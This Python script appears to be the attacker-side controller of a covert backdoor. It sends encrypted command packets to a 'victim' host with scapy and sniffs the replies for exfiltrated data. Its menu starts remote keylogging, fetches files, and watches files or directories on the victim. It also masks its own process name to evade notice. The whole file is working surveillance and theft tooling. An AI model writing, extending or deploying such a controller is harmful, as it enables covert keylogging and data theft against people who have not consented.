#!/usr/bin/env python3


from scapy.all import *
from multiprocessing import Process
import sys, time, argparse, setproctitle
from datetime import datetime
import encryption as encryption


# Parse command-line arguments
parser = argparse.ArgumentParser()

parser.add_argument("-t",
                    "--target",
                    type=str,
                    help="IP of target host (victim)",
                    required=True)

parser.add_argument("-m",
                    "--masq",
                    type=str,
                    help="Process name of this app, to masquerade as",
                    required=False)      

global parseargs
parseargs = parser.parse_args()

# Masquerade this app's process name, if provided
if parseargs.masq is not None:
    setproctitle.setproctitle(parseargs.masq)

is_running = False
processes_list = []


def sniff_response():
    while True:
        sniff(filter=f"ip and tcp and host {parseargs.target} and dst port 8500", count=1, prn=read_pkt)


def sniff_notifs():
    while True:
        sniff(filter=f"ip and tcp and host {parseargs.target} and dst port 8888", count=1, prn=print_notifs)


def print_notifs(pkt):
    notification = pkt[Raw].load

    notification_split = notification.split(b"$NOTIF")
    decrypted_notif = encryption.decrypt_data(notification_split[0]).decode("utf-8")

    print(decrypted_notif)


def read_pkt(pkt):
    payload = pkt[Raw].load

    # Write raw (encrypted) contents to file
    with open("rawdata.txt", "ab") as file:
        file.write(payload)
    
    # If EOF marker is found, decrypt data
    if b"$EOF" in payload:
        decrypt_response()


def decrypt_response():
    filename = ""

    with open("rawdata.txt", "rb") as file:
        data = file.read()

    # Strip EOF marker and decrypt
    data_split = data.split(b"$EOF")
    decrypted = encryption.decrypt_data(data_split[0])

    mode = data_split[1].decode("utf-8")

    current_time = datetime.now().strftime("%Y-%m-%d %H-%M-%S")

    # Write decrypted contents to file
    if "keylog" in mode:
        filename = f"[{current_time}] keylog.txt"
    else:
        filename = f"[{current_time}] {mode}"

    with open(filename, "wb") as file:
        file.write(decrypted)

    # Delete raw data file after successful decryption
    os.remove("rawdata.txt")


def init_func(mode, *args):
    delimiter = "|"
    mode_encrypted = encryption.encrypt_data(mode.encode("utf-8"))
    contents = mode_encrypted.decode("utf-8") + delimiter

    # If optional args supplied (e.g., for filename), add to payload
    if args:
        encrypted_arg = encryption.encrypt_data(args[0].encode("utf-8"))
        contents += encrypted_arg.decode("utf-8") + delimiter

    pkt = IP(dst=parseargs.target)/TCP(sport=RandShort(), dport=8505)/Raw(load=contents)

    send(pkt, verbose=False)
    time.sleep(1)


def main():
    # Initializing sniffing functionalities
    sniff_process = Process(target=sniff_response)
    notifs_process = Process(target=sniff_notifs)
    
    processes_list.append(sniff_process)
    processes_list.append(notifs_process)

    for process in processes_list:
        process.start()

    print("Select option (e.g., 1 for keylogging). Enter 'q' to quit:\n")
    print("[1] Remote keylogging\n[2] Get file\n[3] Watch a file\n[4] Watch a directory\n[q] Quit")

    global is_running

    # Parse menu options
    while True:
        option = input("")

        # Remote keylogging
        if option == "1":    
            if is_running == False:
                print("[Remote keylogging] Started")
                is_running = True
                init_func("keylog")
            else:
                print("[Remote keylogging] Stopped")
                is_running = False
                init_func("keylog")
        
        # Get file
        elif option == "2":
            if is_running == False:
                print("[Get a file] Started")
                is_running = True
                init_func("getfile")
            else:
                print("[Get a file] Stopped")
                is_running = False
                init_func("getfile")
        
        # Watch file
        elif option == "3":
            if is_running == False:
                print("[Watch a file] Started")
                is_running = True

                filename = input("Name of file to watch:\n")
                init_func("watchfile", filename)
            else:
                print("[Watch a file] Stopped")
                is_running = False
                init_func("watchfile")
            # break
        
        # Watch directory
        elif option == "4":
            if is_running == False:
                print("[Watch a directory] Started")
                is_running = True

                dirname = input("Name of directory to watch:\n")
                init_func("watchdir", dirname)
            else:
                print("[Watch a directory] Stopped")
                is_running = False
                init_func("watchdir")
            # break

        # Quit
        elif option == "q":
            print("Bye!")

            # Cleanup processes and send shutdown signal to victim
            for process in processes_list:
                process.terminate()

            init_func("quit")

            break

        # Invalid option
        else:
            print("Invalid option - try again (or 'q' to quit)...")
    
    sys.exit()
        

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("Exiting program...")

        for process in processes_list:
            process.terminate()

        sys.exit()
